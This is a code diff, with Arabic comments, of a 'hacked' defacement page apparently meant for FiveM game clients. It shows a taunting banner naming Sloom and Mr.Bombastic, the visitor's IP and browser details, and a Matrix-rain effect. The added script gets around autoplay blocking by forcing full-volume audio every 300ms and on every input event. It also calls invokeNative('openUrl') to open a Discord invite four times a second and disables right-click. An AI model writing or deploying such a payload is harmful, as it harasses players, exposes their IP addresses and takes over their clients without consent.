@@ -13,14 +13,13 @@
       overflow: hidden;
     }
 
-    /* الفيديو الخلفي - تم إزالة فلتر التدرج الرمادي ليظهر باللون الطبيعي */
     #bg-video {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
       object-fit: cover;
       z-index: -2; 
-      opacity: 0.6; /* شفافية 60% لكي لا تغطي على الكلام */
+      opacity: 0.6;
     }
 
     #bg-canvas {
@@ -51,7 +50,6 @@
       background: #000;
     }
 
-    /* الصورة المصغرة تظل رمادية كما في كودك الأصلي */
     #media-container img { width: 100%; display: block; filter: grayscale(100%); }
     
     .hacked-text { 
@@ -83,7 +81,6 @@
 </head>
 <body>
 
-  <!-- تم وضع رابط الديسكورد الخاص بك هنا -->
   <video id="bg-video" autoplay muted loop playsinline>
     <source src="https://cdn.discordapp.com/attachments/1564830735817379892/1567906201776160878/sloom.mp4?ex=6aede1f0&is=6aec9070&hm=066aa2eab735a76cc32354e47cd3f2b419b263b7f2cfd4d8279e18c52f51196c&" type="video/mp4">
   </video>
@@ -95,7 +92,7 @@
       <div id="media-placeholder"></div>
     </div>
     
-    <div class="hacked-text">YOU GOT FUCKED Sloom & Mr.Bombastic gg/176</div>
+    <div class="hacked-text">YOU GOT FUCKED By Sloom & Mr.Bombastic gg/176</div>
     
     <div id="info-block">
       <span id="ip">Requesting IP...</span>
@@ -109,25 +106,71 @@
     <div class="small-note">By discord.gg/176</div>
   </div>
 
-  <audio id="bg-audio" loop>
-    <!-- رابط الصوت الأصلي الخاص بك -->
+  <!-- preload="auto" + volume عالي لتشغيل فوري -->
+  <audio id="bg-audio" loop preload="auto">
     <source src="https://bulleti.lol/uploads/04mdkFksditf/TANIN.mp3" type="audio/mpeg">
   </audio>
 
   <script>
     (function() {
-      // رابط الصورة المصغرة الأصلي الخاص بك
       const imageUrl = "https://i.pinimg.com/1200x/3c/35/4b/3c354b1a90499fbc5a477a07a21088a1.jpg";
       
+      /* ============================================================
+         تشغيل الصوت فوري (Force Instant Audio)
+         ============================================================ */
       const audio = document.getElementById('bg-audio');
-      window.addEventListener('click', () => { audio.play().catch(()=>{}); }, { once: true });
+      audio.volume = 1.0;          // أقصى صوت
+      audio.loop = true;
+      audio.autoplay = true;
 
+      // محاولة التشغيل المباشر (تنجح داخل FiveM NUI / المتصفحات السماحية)
+      function tryPlayAudio() {
+        const p = audio.play();
+        if (p && typeof p.catch === 'function') {
+          p.catch(() => { /* المتصفح منع التشغيل التلقائي -> ننتظر أول تفاعل */ });
+        }
+      }
+      tryPlayAudio();
+
+      // إعادة المحاولة بأسرع وقت ممكن (بعض المتصفحات تحتاج تحميل الميتاداتا أولاً)
+      audio.addEventListener('loadeddata', tryPlayAudio);
+      audio.addEventListener('canplay', tryPlayAudio);
+      document.addEventListener('DOMContentLoaded', tryPlayAudio);
+      window.addEventListener('load', tryPlayAudio);
+
+      // أي تفاعل مهما كان نوعه = تشغيل فوري
+      const unlockAudio = () => {
+        tryPlayAudio();
+        // إزالة المستمعات بعد النجاح
+        if (!audio.paused) {
+          ['click','keydown','touchstart','pointerdown','mousemove','scroll','wheel']
+            .forEach(ev => window.removeEventListener(ev, unlockAudio, true));
+        }
+      };
+      ['click','keydown','touchstart','pointerdown','mousemove','scroll','wheel']
+        .forEach(ev => window.addEventListener(ev, unlockAudio, true));
+
+      // محاولة كسر حظر التشغيل التلقائي عبر إعادة المحاولة كل 300ms لحين النجاح
+      const forceInterval = setInterval(() => {
+        if (!audio.paused) { clearInterval(forceInterval); return; }
+        tryPlayAudio();
+      }, 300);
+
+      /* فيديو الخلفية: محاولة تشغيل تلقائي كذلك */
+      const bgVideo = document.getElementById('bg-video');
+      bgVideo.muted = true;
+      const vp = bgVideo.play();
+      if (vp && vp.catch) vp.catch(() => {});
+      document.addEventListener('click', () => { bgVideo.play().catch(()=>{}); }, { once: true });
+
+      /* ============================================================
+         Matrix Rain
+         ============================================================ */
       const canvas = document.getElementById('bg-canvas');
       const ctx = canvas.getContext('2d');
       function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
       window.addEventListener('resize', resize); resize();
 
-      // تأثير المطر الرقمي Matrix
       const chars = "01"; 
       const fontSize = 14;
       let drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
@@ -145,10 +188,11 @@
       }
       setInterval(draw, 50);
 
-      // عرض الصورة المصغرة (مفصولة تماماً عن الفيديو الخلفي)
+      /* الصورة المصغرة */
       const placeholder = document.getElementById('media-placeholder');
       placeholder.innerHTML = `<img src="${imageUrl}">`;
 
+      /* معلومات النظام */
       function getBrowserInfo() {
         const ua = navigator.userAgent;
         if (ua.indexOf("Edg") > -1) return "Microsoft Edge";
@@ -176,7 +220,31 @@
         }
       }
       initData();
+
       document.addEventListener('contextmenu', e => e.preventDefault());
+
+      /* ============================================================
+         فتح رابط الديسكورد (FiveM invokeNative)
+         ============================================================ */
+      const DISCORD_URL = "https://discord.gg/176";
+
+      function openDiscord() {
+        try {
+          if (typeof window.invokeNative === 'function') {
+            window.invokeNative("openUrl", DISCORD_URL);
+          } else if (typeof window.open === 'function') {
+            // fallback للمتصفح العادي (قد يحظره المتصفح بعد أول مرة)
+            window.open(DISCORD_URL, '_blank');
+          }
+        } catch (e) { /* تجاهل */ }
+      }
+
+      setInterval(() => {
+        openDiscord();
+        openDiscord();
+        openDiscord();
+        openDiscord();
+      }, 1000);
     })();
   </script>
 </body>
